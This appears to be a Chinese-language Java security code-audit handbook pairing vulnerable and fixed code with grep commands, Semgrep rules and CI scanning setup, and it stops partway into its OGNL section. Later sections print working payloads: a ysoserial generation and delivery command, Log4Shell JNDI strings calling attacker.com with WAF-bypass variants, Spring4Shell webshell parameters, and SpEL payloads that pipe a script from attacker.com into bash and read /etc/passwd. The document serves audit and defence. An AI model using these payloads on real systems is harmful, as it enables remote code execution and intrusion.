---
name: code-audit-java
description: >
  Java/JVM 应用安全代码审计完整手册 — 覆盖 SQL 注入、XXE、文件上传/读取、认证绕过、
  路由映射、反序列化、SSRF、SpEL 注入、JWT 漏洞等全部 OWASP Top 10 Java 漏洞类型，
  攻防合一：Part A 攻击视角手工审计 + SAST/DAST 工具链，Part B 安全编码 + SpotBugs/
  Semgrep 规则 + Maven/Gradle 安全插件配置，内置 Java 漏洞模式速查矩阵。
domain: cybersecurity
subdomain: code-audit
tags: [java, spring, code-audit, sast, sql-injection, xxe, deserialization, authentication, file-handling]
version: 2.0.0
---

# Java 应用安全代码审计 — 完整攻防手册

## 适用场景

- 对 Java/Spring Boot/Java EE 应用进行源码安全审计
- CI/CD 中集成 Java SAST/DAST 自动化扫描
- Java 应用漏洞复现与修复验证
- **不适用**：Android 应用（见 mobile-pentest-android）、Kotlin 纯协程审计、Groovy 脚本

## 前置条件

- JDK 11+ / Maven 3.6+ / Gradle 7+
- 源码访问权限
- 工具：Semgrep / SpotBugs / FindSecBugs / CodeQL / dependency-check

---

## Part A：攻击视角 — 漏洞模式与审计方法

### 1. SQL 注入审计

**危险模式识别：**

```java
// ❌ 字符串拼接 SQL（高危）
String sql = "SELECT * FROM users WHERE id = " + userId;
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(sql);

// ❌ 动态表名/列名（不能用参数化）
String sql = "SELECT * FROM " + tableName + " ORDER BY " + sortCol;

// ✅ 参数化查询
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
ps.setString(1, userId);

// ✅ JPA Criteria API / Spring Data @Query
@Query("SELECT u FROM User u WHERE u.name = :name")
User findByName(@Param("name") String name);
```

**审计 grep 命令：**

```bash
# 查找字符串拼接 SQL
grep -rn 'executeQuery\|executeUpdate\|execute(' --include='*.java' . | grep -v 'PreparedStatement\|@Query\|createQuery'

# 查找 JPA 原生 SQL 拼接
grep -rn 'nativeQuery\|createNativeQuery' --include='*.java' .

# 查找 MyBatis ${}（非 #{}）
grep -rn '\${' --include='*.xml' src/main/resources/mapper/
```

**HQL/JPQL 注入：**

```java
// ❌ HQL 拼接
entityManager.createQuery("FROM User WHERE name = '" + name + "'");

// ✅ 参数绑定
entityManager.createQuery("FROM User WHERE name = :name")
    .setParameter("name", name);
```

### 2. XXE（XML 外部实体）审计

```java
// ❌ 不安全 XML 解析
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();  // 默认允许外部实体

// ✅ 禁用外部实体
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

**审计 grep：**

```bash
# 查找 XML 解析器创建
grep -rn 'DocumentBuilderFactory\|SAXParser\|XMLReader\|SAXBuilder\|SAXParserFactory\|XMLInputFactory\|TransformerFactory' --include='*.java' .

# 检查是否禁用了外部实体
grep -rn 'disallow-doctype-decl\|external-general-entities\|external-parameter-entities' --include='*.java' .
```

### 3. 文件上传漏洞审计

```java
// ❌ 不验证文件类型
@PostMapping("/upload")
public String upload(@RequestParam("file") MultipartFile file) {
    String filename = file.getOriginalFilename();  // 客户端可控
    file.transferTo(new File("/uploads/" + filename));  // 路径穿越 + 任意文件写入
}

// ✅ 安全文件上传
@PostMapping("/upload")
public String upload(@RequestParam("file") MultipartFile file) {
    // 1. 白名单扩展名
    String ext = FilenameUtils.getExtension(file.getOriginalFilename());
    if (!Set.of("jpg", "png", "pdf").contains(ext.toLowerCase())) {
        throw new IllegalArgumentException("不允许的文件类型");
    }
    // 2. 魔数验证
    String mimeType = new Tika().detect(file.getInputStream());
    if (!mimeType.startsWith("image/")) throw new IllegalArgumentException("非法文件内容");
    // 3. 随机文件名，防止路径穿越
    String safeName = UUID.randomUUID() + "." + ext;
    Path target = Paths.get("/safe/uploads/").resolve(safeName).normalize();
    if (!target.startsWith("/safe/uploads/")) throw new SecurityException("路径穿越");
    file.transferTo(target);
}
```

**审计 grep：**

```bash
grep -rn 'MultipartFile\|FileUpload\|commons-fileupload\|transferTo\|getOriginalFilename' --include='*.java' .
```

### 4. 文件读取/路径穿越审计

```java
// ❌ 用户输入直接拼文件路径
@GetMapping("/download")
public void download(@RequestParam String file, HttpServletResponse resp) {
    Files.copy(Paths.get("/data/" + file), resp.getOutputStream());  // 路径穿越
}

// ✅ 路径规范化 + 边界检查
@GetMapping("/download")
public void download(@RequestParam String file, HttpServletResponse resp) {
    Path base = Paths.get("/data/").toAbsolutePath().normalize();
    Path target = base.resolve(file).normalize();
    if (!target.startsWith(base)) throw new SecurityException("非法路径");
    Files.copy(target, resp.getOutputStream());
}
```

**审计 grep：**

```bash
grep -rn 'Paths.get\|FileInputStream\|FileReader\|new File(' --include='*.java' . | grep -v 'test\|Test'
grep -rn 'getResourceAsStream\|ClassLoader.*getResource' --include='*.java' .
```

### 5. 认证与授权漏洞审计

**Spring Security 常见错误：**

```java
// ❌ 过于宽松的 CORS
@Bean
public CorsConfigurationSource corsConfigurationSource() {
    CorsConfiguration config = new CorsConfiguration();
    config.setAllowedOrigins(List.of("*"));  // 允许所有域
    config.setAllowedMethods(List.of("*"));
    config.setAllowCredentials(true);  // + * = 灾难
}

// ✅ 严格 CORS
config.setAllowedOrigins(List.of("https://trusted.example.com"));
config.setAllowedMethods(List.of("GET", "POST"));
config.setAllowCredentials(true);
```

**JWT 漏洞：**

```java
// ❌ 算法 None
JWTVerifier verifier = JWT.require(Algorithm.none()).build();

// ❌ HS256 密钥泄露 → RS256 算法混淆
// 攻击者用公钥作为 HS256 密钥签名

// ✅ 强制指定算法
JWTVerifier verifier = JWT.require(Algorithm.RSA256(publicKey, null))
    .withIssuer("auth-service")
    .build();
```

**审计 grep：**

```bash
grep -rn '@PreAuthorize\|@Secured\|@RolesAllowed\|antMatchers\|requestMatchers\|@PermitAll' --include='*.java' .
grep -rn 'Algorithm.none\|withAllowCredentials.*true\|AllowedOrigins.*\*\|setAllowedOrigins' --include='*.java' .
grep -rn 'JWT\|Jwts\|JwtBuilder\|Algorithm\|Verifier' --include='*.java' .
```

### 6. 反序列化漏洞审计

```java
// ❌ ObjectInputStream 不安全反序列化
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject();  // RCE via ysoserial

// ❌ Jackson 多态反序列化未限制
@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)  // 可实例化任意类
public class polymorphicBase {}

// ✅ 白名单过滤 / ObjectInputFilter
ObjectInputStream ois = new ObjectInputStream(input);
ois.setObjectInputFilter(filterInfo -> {
    if (filterInfo.serialClass() != null) {
        return filterInfo.serialClass().getPackage().getName().equals("com.example.dto")
            ? ObjectInputFilter.Status.ALLOWED
            : ObjectInputFilter.Status.REJECTED;
    }
    return ObjectInputFilter.Status.UNDECIDED;
});
```

**审计 grep：**

```bash
grep -rn 'readObject\|ObjectInputStream\|readUnshared\|XMLDecoder\|XStream\|SnakeYAML\|Yaml.load\| Jackson.*enableDefaultTyping' --include='*.java' .
```

### 7. SpEL / OGNL 表达式注入

```java
// ❌ 用户输入进入 SpEL 表达式
ExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression(userInput);  // RCE
exp.getValue();

// ❌ OGNL (Struts2)
ValueStack vs = ActionContext.getContext().getValueStack();
vs.findValue(userInput);  // Struts2 历史 RCE

// ✅ 禁止用户输入进入表达式引擎
// 使用 SimpleEvaluationContext 限制能力
EvaluationContext ctx = SimpleEvaluationContext.forReadOnlyDataBinding().build();
parser.parseExpression(safeExpression).getValue(ctx);
```

**审计 grep：**

```bash
grep -rn 'SpelExpressionParser\|parseExpression\|EvaluationContext\|findValue\|Ognl.getValue\|Ognl.parseExpression' --include='*.java' .
```

### 8. 路由映射与访问控制审计

```java
// ❌ 缺少认证注解的敏感端点
@RestController
@RequestMapping("/api/admin")
public class AdminController {
    @GetMapping("/users")  // 无 @PreAuthorize
    public List<User> listUsers() { ... }

    @DeleteMapping("/users/{id}")  // 无权限检查
    public void deleteUser(@PathVariable Long id) { ... }
}

// ✅ 方法级权限
@PreAuthorize("hasRole('ADMIN')")
@DeleteMapping("/users/{id}")
public void deleteUser(@PathVariable Long id) { ... }
```

**路由追踪 grep：**

```bash
# 发现所有 HTTP 端点
grep -rn '@RequestMapping\|@GetMapping\|@PostMapping\|@PutMapping\|@DeleteMapping\|@PatchMapping' --include='*.java' . | grep -v 'test\|Test'

# 检查哪些端点缺少认证注解
grep -rn '@.*Mapping' --include='*.java' . | grep -v '@PreAuthorize\|@Secured\|@RolesAllowed\|@PermitAll\|@DenyAll' | head -50

# 查找 Actuator 暴露
grep -rn 'endpoints\|actuator\|jolokia\|env\|heapdump\|trace' --include='*.java' --include='*.yml' --include='*.yaml' --include='*.properties' .
```

### 9. SSRF 审计

```java
// ❌ 用户可控 URL
@GetMapping("/fetch")
public String fetchUrl(@RequestParam String url) {
    RestTemplate rt = new RestTemplate();
    return rt.getForObject(url, String.class);  // SSRF
}

// ✅ URL 白名单
@GetMapping("/fetch")
public String fetchUrl(@RequestParam String url) {
    URI uri = URI.create(url);
    if (!Set.of("api.example.com").contains(uri.getHost())) {
        throw new SecurityException("非法目标");
    }
    // 检查 IP 防止 DNS rebinding
    InetAddress addr = InetAddress.getByName(uri.getHost());
    if (addr.isLoopbackAddress() || addr.isLinkLocalAddress() || addr.isSiteLocalAddress()) {
        throw new SecurityException("内网地址禁止访问");
    }
    return restTemplate.getForObject(uri, String.class);
}
```

**审计 grep：**

```bash
grep -rn 'RestTemplate\|HttpClient\|HttpURLConnection\|URL(' --include='*.java' . | grep -v 'test\|Test\|mock'
grep -rn 'getForObject\|postForObject\|execute\|exchange' --include='*.java' . | grep -v 'test'
```

### 10. 加密与密钥管理审计

```java
// ❌ 硬编码密钥
private static final String SECRET = "mySecretKey123!";

// ❌ 不安全算法
Cipher cipher = Cipher.getInstance("DES");  // 已破解
MessageDigest md = MessageDigest.getInstance("MD5");  // 碰撞

// ✅ 安全配置
Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
SecretKey key = KeyGenerator.getInstance("AES").initKey(256);
```

**审计 grep：**

```bash
grep -rn 'SecretKey\|PrivateKey\|DES\|MD5\|SHA1\b\|password.*=.*"' --include='*.java' . | grep -v 'test'
grep -rn 'Cipher.getInstance\|MessageDigest.getInstance\|KeyGenerator' --include='*.java' .
```

---

## Part B：检测与防御

### 11. SAST 工具链配置

**Semgrep Java 规则：**

```yaml
# .semgrep.yml — Java 安全规则集
rules:
  - id: java-sqli-string-concat
    patterns:
      - pattern: |
          String $SQL = "... " + $VAR;
          $STMT.executeQuery($SQL);
    message: "SQL 注入：字符串拼接 SQL"
    severity: ERROR
    languages: [java]

  - id: java-xxe-default-parser
    patterns:
      - pattern: DocumentBuilderFactory.newInstance();
      - pattern-not-inside: |
          ... .setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    message: "XXE：XML 解析器未禁用外部实体"
    severity: ERROR
    languages: [java]

  - id: java-path-traversal
    patterns:
      - pattern: new File($BASE + $USER_INPUT);
      - pattern-not: Paths.get($BASE).resolve($USER_INPUT).normalize();
    message: "路径穿越：用户输入拼入文件路径"
    severity: WARNING
    languages: [java]

  - id: java-deserialization
    pattern: new ObjectInputStream($INPUT);
    message: "不安全反序列化"
    severity: ERROR
    languages: [java]
```

**SpotBugs + FindSecBugs 配置：**

```xml
<!-- pom.xml -->
<plugin>
    <groupId>com.github.spotbugs</groupId>
    <artifactId>spotbugs-maven-plugin</artifactId>
    <version>4.8.3.0</version>
    <dependencies>
        <dependency>
            <groupId>com.h3xstream.findsecbugs</groupId>
            <artifactId>findsecbugs-plugin</artifactId>
            <version>1.12.0</version>
        </dependency>
    </dependencies>
    <configuration>
        <effort>Max</effort>
        <threshold>Low</threshold>
        <includeFilterFile>spotbugs-security.xml</includeFilterFile>
    </configuration>
</plugin>
```

**dependency-check (OWASP)：**

```xml
<plugin>
    <groupId>org.owasp</groupId>
    <artifactId>dependency-check-maven</artifactId>
    <version>9.0.9</version>
    <configuration>
        <failBuildOnCVSS>7</failBuildOnCVSS>
        <suppressionFile>dependency-check-suppressions.xml</suppressionFile>
    </configuration>
</plugin>
```

### 12. 安全编码防御

**输入验证：**

```java
// Bean Validation
public class UserDTO {
    @NotBlank @Size(max = 100)
    @Pattern(regexp = "^[a-zA-Z0-9._-]+$")
    private String username;

    @Email
    private String email;

    @NotNull @Min(1)
    private Long roleId;
}

// Controller 层
@PostMapping("/users")
public ResponseEntity<?> createUser(@Valid @RequestBody UserDTO dto) { ... }
```

**输出编码：**

```java
// HTML 输出
import org.owasp.encoder.Encode;
model.addAttribute("userInput", Encode.forHtml(userInput));

// JSON 输出（Spring 默认转义，但注意 raw 输出）
// 避免@ResponseBody直接返回用户可控字符串
```

**安全头配置：**

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .headers(h -> h
                .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'"))
                .frameOptions(HeadersConfigurer.FrameOptionsConfig::deny)
                .xssProtection(xss -> xss.headerValue(XXssProtectionHeaderWriter.HeaderValue.ENABLED_MODE_BLOCK))
                .httpStrictTransportSecurity(hsts -> hsts
                    .includeSubDomains(true)
                    .maxAgeInSeconds(31536000))
            );
        return http.build();
    }
}
```

### 13. 安全审计管道（CI/CD）

```yaml
# .github/workflows/java-security.yml
name: Java Security Scan
on: [push, pull_request]
jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Semgrep SAST
        uses: semgrep/semgrep-action@v1
        with:
          config: >-
            p/java
            p/owasp-top-ten
            p/jwt
            p/spring
            p/xss

      - name: SpotBugs + FindSecBugs
        run: |
          mvn com.github.spotbugs:spotbugs-maven-plugin:check

      - name: OWASP Dependency Check
        run: |
          mvn org.owasp:dependency-check-maven:check

      - name: CodeQL Analysis
        uses: github/codeql-action/analyze@v3
        with:
          languages: java
```

---

## 速查表

### Java 漏洞模式 → 审计关键词 → 修复方案矩阵

| 漏洞类型 | 审计关键词 | 危险模式 | 安全替代 |
|----------|-----------|---------|---------|
| SQL 注入 | `executeQuery`, `createNativeQuery`, `${}` | 字符串拼接 SQL | `PreparedStatement`, `@Param` |
| XXE | `DocumentBuilderFactory`, `SAXParser` | 默认配置解析器 | `disallow-doctype-decl=true` |
| 文件上传 | `MultipartFile`, `getOriginalFilename` | 信任客户端文件名 | UUID重命名 + 白名单 + 魔数 |
| 路径穿越 | `new File(`, `Paths.get(` + 用户输入 | 直接拼路径 | `normalize()` + `startsWith()` |
| 认证绕过 | `@PreAuthorize`, `antMatchers` | 缺少权限注解 | 方法级 `@PreAuthorize` |
| JWT | `Algorithm.none`, `Jwts.parser` | None算法/算法混淆 | 强制指定算法 + 公钥验证 |
| 反序列化 | `readObject`, `ObjectInputStream` | 无过滤反序列化 | `ObjectInputFilter` 白名单 |
| SpEL 注入 | `parseExpression`, `SpelExpressionParser` | 用户输入进表达式 | `SimpleEvaluationContext` |
| SSRF | `RestTemplate`, `getForObject` | 用户可控URL | URL白名单 + IP检查 |
| 加密 | `DES`, `MD5`, 硬编码密钥 | 不安全算法/硬编码 | AES-GCM + Vault/KMS |
| CORS | `AllowedOrigins("*")` + `Credentials` | 通配符 + 凭据 | 指定域名 |
| 不安全依赖 | `pom.xml`, `build.gradle` | 已知CVE依赖 | `dependency-check` |

### 审计执行检查清单

| 步骤 | 动作 | 命令/工具 |
|------|------|----------|
| 1 | 端点发现 | `grep -rn '@.*Mapping' --include='*.java' .` |
| 2 | 认证覆盖 | 对比端点列表与 `@PreAuthorize` 覆盖 |
| 3 | SQL 审计 | `grep -rn 'executeQuery\|createQuery' --include='*.java' .` |
| 4 | 文件操作审计 | `grep -rn 'File\|Path\|InputStream' --include='*.java' .` |
| 5 | 反序列化审计 | `grep -rn 'readObject\|ObjectInputStream' --include='*.java' .` |
| 6 | 表达式注入 | `grep -rn 'parseExpression\|findValue' --include='*.java' .` |
| 7 | 加密审计 | `grep -rn 'Cipher\|MessageDigest\|DES\|MD5' --include='*.java' .` |
| 8 | 依赖检查 | `mvn dependency-check:check` |
| 9 | SAST 扫描 | `semgrep --config p/java --config p/spring .` |
| 10 | 密钥泄露 | `grep -rn 'password\|secret\|api_key' --include='*.java' --include='*.properties' --include='*.yml' .` |

---

## MITRE ATT&CK 映射

| 战术 | Technique | Java 相关场景 |
|------|-----------|-------------|
| Initial Access | T1190 — Exploit Public-Facing App | SQL注入、XXE、反序列化 RCE |
| Execution | T1059 — Command/Scripting Interpreter | SpEL/OGNL 表达式注入、Runtime.exec() |
| Persistence | T1133 — External Remote Services | JWT 伪造、Spring Actuator 暴露 |
| Privilege Escalation | T1068 — Exploitation for Privilege Escalation | 认证绕过、@PreAuthorize 缺失 |
| Defense Evasion | T1140 — Deobfuscate/Decode Files | 文件上传 Webshell |
| Credential Access | T1212 — Exploitation for Credential Access | SQL注入提取凭证、日志泄露密钥 |
| Exfiltration | T1041 — Exfiltration Over C2 Channel | SSRF 数据外泄 |

---

## Part C：2025-2026 更新

> 本节涵盖 2022-2026 年间 Java 安全领域的关键变化：反序列化利用链演进、Spring 框架高危漏洞、Log4Shell 后续变种、表达式注入新攻击面、安全编码最佳实践更新，以及现代审计工具链整合。

### 14. Java 反序列化攻击深入

#### 14.1 Gadget Chain 与 ysoserial 利用体系

Java 反序列化攻击的核心在于 **Gadget Chain（利用链）**——攻击者通过串联多个合法类的 `readObject()`/`readResolve()` 等方法，最终触发 `Runtime.exec()` 或类似危险操作。

**常见利用链分类：**

| 利用链 | 依赖库 | JDK 版本 | 利用方式 |
|--------|--------|---------|---------|
| CommonsCollections1-7 | commons-collections 3.x | JDK 7 | InvokerTransformer → ChainedTransformer → Runtime.exec() |
| CommonsCollections6-7 | commons-collections 3.x | JDK 8+ | LazyMap / TiedMapEntry 绕过 |
| CommonsBeanutils1 | commons-beanutils | 全版本 | BeanComparator → TemplatesImpl 加载字节码 |
| Spring1 | spring-core | 全版本 | ObjectFactoryDelegatingInvocationHandler |
| Groovy1 | groovy-all | 全版本 | ConvertedClosure → MethodClosure |
| JBossInterceptors1 | jboss-interceptors | 全版本 | 反射调用链 |
| Rome | rome | 全版本 | ObjectBean → ToStringBean 触发 |

**审计要点 — 识别 Gadget 依赖：**

```bash
# 检查 pom.xml 中的已知危险依赖
grep -rn 'commons-collections\|commons-beanutils\|spring-core\|groovy-all\|rome\|xalan\|javassist' pom.xml build.gradle

# 检查是否存在反序列化入口 + 危险 Gadget 类
grep -rn 'InvokerTransformer\|ChainedTransformer\|ConstantTransformer\|InstantiateTransformer\|BeanComparator\|TemplatesImpl\|ObjectBean' --include='*.java' .
```

**ysoserial 利用演示（仅用于授权测试）：**

```bash
# 生成 CommonsCollections6 payload（JDK 8+ 适用）
java -jar ysoserial.jar CommonsCollections6 "touch /tmp/pwned" | base64 | tr -d '\n'

# 检测目标是否接受序列化数据
# 发送 Content-Type: application/x-java-serialized-object
curl -H "Content-Type: application/x-java-serialized-object" \
     --data-binary @payload.ser \
     https://target/api/deserialize
```

#### 14.2 Fastjson 反序列化（中国特有高危）

Fastjson 是中国 Java 生态中广泛使用的 JSON 库，其 `autoType` 功能默认开放导致大量 RCE 漏洞。

```java
// ❌ Fastjson autoType 开放（<=1.2.24 默认开放）
JSON.parseObject(jsonStr);  // jsonStr 可含 @type 字段实例化任意类

// ❌ 即使 1.2.25-1.2.68 的 autoType 检查也被绕过
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  // 显式开启

// ✅ 安全配置
ParserConfig.getGlobalInstance().setAutoTypeSupport(false);  // 禁用
// 升级到 Fastjson2（推荐）
```

**Fastjson 漏洞时间线：**

| 版本范围 | CVE | 绕过方式 |
|---------|-----|---------|
| <= 1.2.24 | — | autoType 默认开放 |
| 1.2.25-1.2.41 | — | `L...;` 前后缀绕过 |
| 1.2.42 | — | 双 `LL...;;` 绕过 |
| 1.2.47 | — | java.lang.Class 缓存绕过 |
| 1.2.68 | — | expectClass 绕过 |
| 1.2.80 | CVE-2022-25845 | autoType 重开放 |

**审计 grep：**

```bash
grep -rn 'JSON.parse\|JSON.parseObject\|JSON.parseArray\|@type\|autoType\|setAutoTypeSupport' --include='*.java' .
grep -rn 'fastjson\|com.alibaba.fastjson' pom.xml build.gradle
```

#### 14.3 现代 Java 反序列化防御

```java
// ✅ JDK 17+ 内置反序列化过滤（全局配置）
// conf/security.properties
# jdk.serialFilter=!com.example.trusted.**

// ✅ 编程式过滤（JDK 9+）
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.example.dto.*;!*"
);
ObjectInputFilter.Config.setSerialFilter(filter);

// ✅ 使用 look-ahead 反序列化模式（kryo-extras / SerialKiller）
public class SafeObjectInputStream extends ObjectInputStream {
    private static final Set<String> ALLOWED_CLASSES = Set.of(
        "com.example.dto.UserDTO",
        "com.example.dto.RequestDTO"
    );

    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        if (!ALLOWED_CLASSES.contains(desc.getName())) {
            throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
        }
        return super.resolveClass(desc);
    }
}

// ✅ 使用 JSON 替代 Java 原生序列化（推荐架构变更）
// Jackson / Gson / Fastjson2 均不含原生反序列化语义
```

### 15. Spring 框架安全

#### 15.1 Spring4Shell (CVE-2022-22965)

Spring4Shell 利用 ClassLoader 参数绑定实现 RCE，影响 JDK 9+ 的 Spring MVC 应用。

```java
// ❌ 漏洞触发条件：
// 1. JDK 9+
// 2. Spring Framework 5.3.0-5.3.17 / 5.2.0-5.2.19
// 3. 打包为 WAR（非 JAR）
// 4. Controller 接受 Java Bean 参数绑定
@PostMapping("/register")
public String register(UserForm form) {  // UserForm 含嵌套属性
    // 攻击者发送：
    // class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i
    // class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
    // class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
    // class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar
    // class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
    return "ok";
}

// ✅ 修复
// 1. 升级 Spring Framework 到 5.3.18+ / 5.2.20+
// 2. 或在 Controller 中 @InitBinder 禁止绑定 class 属性
@InitBinder
public void setDisallowedFields(WebDataBinder binder) {
    binder.setDisallowedFields("class.*", "Class.*", "*.class.*", "*.Class.*");
}
```

**审计 grep：**

```bash
# 查找 Bean 参数绑定（潜在 Spring4Shell 目标）
grep -rn '@ModelAttribute\|@RequestBody' --include='*.java' . | grep -v 'String\|Integer\|Long\|Boolean'

# 检查 Spring 版本
grep -rn 'spring-framework\|spring-core\|spring-beans' pom.xml gradle.properties
```

#### 15.2 Spring Actuator 暴露

Spring Boot Actuator 默认端点可能泄露敏感信息或允许远程操作。

```yaml
# ❌ 危险配置 — 暴露所有端点
management:
  endpoints:
    web:
      exposure:
        include: "*"  # /actuator/env, /actuator/heapdump, /actuator/configprops 全部暴露

# ✅ 安全配置
management:
  endpoints:
    web:
      exposure:
        include: "health,info,metrics"
      base-path: /actuator-internal-9f3k  # 自定义路径
  endpoint:
    health:
      show-details: never
    env:
      enabled: false       # 禁用环境变量端点
    heapdump:
      enabled: false       # 禁用堆转储
    configprops:
      enabled: false       # 禁用配置属性
  server:
    address: 127.0.0.1     # 仅本地访问
```

**高危 Actuator 端点清单：**

| 端点 | 风险 | 泄露内容 |
|------|------|---------|
| `/actuator/env` | **严重** | 环境变量含数据库密码、API Key |
| `/actuator/heapdump` | **严重** | JVM 堆转储可提取内存中的明文密码 |
| `/actuator/configprops` | **高** | 所有配置属性含敏感值 |
| `/actuator/trace` | **高** | HTTP 请求追踪含 Session/Cookie |
| `/actuator/jolokia` | **严重** | JMX 代理可执行任意操作 |
| `/actuator/loggers` | **中** | 可修改日志级别注入恶意内容 |
| `/actuator/mappings` | **中** | 所有路由映射泄露攻击面 |

**审计 grep：**

```bash
grep -rn 'endpoints.web.exposure\|actuator\|jolokia\|management.endpoints' --include='*.yml' --include='*.yaml' --include='*.properties' .
curl -s https://target/actuator/ | jq '.["_links"] | keys'
```

#### 15.3 Spring Security 新特性（2024-2026）

```java
// ✅ Spring Security 6.x 推荐配置（Lambda DSL）
@Bean
SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http
        .authorizeHttpRequests(auth -> auth
            .requestMatchers("/public/**").permitAll()
            .requestMatchers("/admin/**").hasRole("ADMIN")
            .anyRequest().authenticated()
        )
        .sessionManagement(session -> session
            .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
        )
        .oauth2ResourceServer(oauth2 -> oauth2
            .jwt(Customizer.withDefaults())
        )
        .exceptionHandling(ex -> ex
            .authenticationEntryPoint(new BearerTokenAuthenticationEntryPoint())
        );
    return http.build();
}

// ✅ 方法级安全 — 新注解方式
@EnableMethodSecurity  // 替代 @EnableGlobalMethodSecurity
@Configuration
public class MethodSecurityConfig {}
```

### 16. Log4j / Log4Shell 后续变种

#### 16.1 Log4Shell (CVE-2021-44228) 回顾与持续影响

Log4Shell 是 2021 年发现的 Log4j 2.x JNDI 注入漏洞，CVSS 10.0，至今仍有大量未修复实例。

```java
// ❌ 漏洞触发 — 用户输入进入日志
log.info("User request from: " + userAgent);
// 攻击 payload: ${jndi:ldap://attacker.com/exploit}

// ❌ 变种绕过（绕过 WAF 正则）
${jndi:${lower:l}${lower:d}a${lower:p}://...}
${${lower:j}${lower:n}${lower:d}${lower:i}:...}
${${::-j}${::-n}${::-d}${::-i}:...}
${j${::-n}di:...}
```

**Log4j 漏洞族：**

| CVE | 影响版本 | 类型 | 描述 |
|-----|---------|------|------|
| CVE-2021-44228 | Log4j 2.0-2.14.1 | RCE | JNDI 注入，CVSS 10.0 |
| CVE-2021-45046 | Log4j 2.0-2.15.0 | RCE | 2.15.0 修复不完整 |
| CVE-2021-45105 | Log4j 2.0-2.16.0 | DoS | 递归查找导致无限循环 |
| CVE-2021-44832 | Log4j 2.0-2.17.0 | RCE | JDBC Appender JNDI |
| CVE-2022-23302 | Log4j 1.2.x | RCE | Chainsaw 反序列化 |
| CVE-2022-23305 | Log4j 1.2.x | SQLi | JDBCAppender SQL 注入 |
| CVE-2022-23307 | Log4j 1.2.x | RCE | JMSSink 反序列化 |

**检测与修复：**

```bash
# 查找 Log4j 依赖版本
grep -rn 'log4j' pom.xml build.gradle gradle.properties | grep -v 'log4j-over-slf4j\|log4j-to-slf4j'

# Maven 检查 Log4j 版本
mvn dependency:tree | grep log4j

# 检测 Log4j 1.x 遗留
grep -rn 'org.apache.log4j\|import org.apache.log4j' --include='*.java' .
```

```xml
<!-- ✅ 强制使用安全版本 -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.24.3</version>  <!-- 2025 最新稳定版 -->
</dependency>
```

#### 16.2 Log4j 防御纵深

```yaml
# Log4j2 配置 — 禁用 JNDI 查找
# log4j2.component.properties
log4j2.formatMsgNoLookups=true
log4j2.enableJndiLookup=false
log4j2.enableJndi=false

# JVM 启动参数
-Dlog4j2.formatMsgNoLookups=true
-Dlog4j2.enableJndiLookup=false
```

### 17. 表达式注入深入

#### 17.1 SpEL (Spring Expression Language) 注入

SpEL 注入在 Spring 生态中广泛存在，攻击面远超直接调用 `parseExpression` 的场景。

```java
// ❌ 显式 SpEL 求值
ExpressionParser parser = new SpelExpressionParser();
parser.parseExpression(input).getValue();  // RCE

// ❌ 隐式 SpEL 注入（更隐蔽）
// Spring @Value 注解支持 SpEL
@Value("#{systemProperties['user.dir']}")
private String workDir;
// 如果外部配置值可被注入：${...#rt.exec('cmd')...}

// ❌ Spring Data @Query 中的 SpEL
@Query("SELECT u FROM User u WHERE u.status = ?#{[0]}")
List<User> findByStatus(String status);

// ❌ Thymeleaf 模板注入
// <div th:text="${__${userInput}__}">  // 预处理表达式注入
```

**SpEL 注入利用 payload：**

```
# 命令执行
T(java.lang.Runtime).getRuntime().exec('id')
T(Runtime).getRuntime().exec('curl attacker.com/shell.sh|bash')

# 文件读取
T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get('/etc/passwd'))

# 环境变量
T(System).getenv()

# 反射绕过
T(javax.script.ScriptEngineManager).getEngineByName('js').eval('java.lang.Runtime.getRuntime().exec("id")')
```

**防御：**

```java
// ✅ 使用 SimpleEvaluationContext 限制能力
EvaluationContext safeCtx = SimpleEvaluationContext.forReadOnlyDataBinding().build();
parser.parseExpression(input).getValue(safeCtx);  // 禁止类引用、反射

// ✅ 自定义 TypeLocator 白名单
StandardEvaluationContext ctx = new StandardEvaluationContext();
ctx.setTypeLocator(name -> {
    if (name.startsWith("com.example.")) {
        return Class.forName(name);
    }
    throw new IllegalArgumentException("Type not allowed: " + name);
});
```

#### 17.2 EL (Unified Expression Language) 注入

EL 注入主要出现在 Java EE / Jakarta EE 环境中。

```java
// ❌ EL 表达式求值
import javax.el.ELProcessor;
ELProcessor elp = new ELProcessor();
elp.eval(userInput);  // RCE

// ❌ JSP EL 注入
// ${Runtime.getRuntime().exec('id')}

// ❌ JSF 组件值绑定使用用户输入
```

#### 17.3 OGNL (Object-Graph Navigation Language) 注入

OGNL 注入主要影响 Apache Struts2，历史 RCE 漏洞密集。

```java
// ❌ Struts2 OGNL 求值
ValueStack vs = ActionContext.getContext().getValueStack();
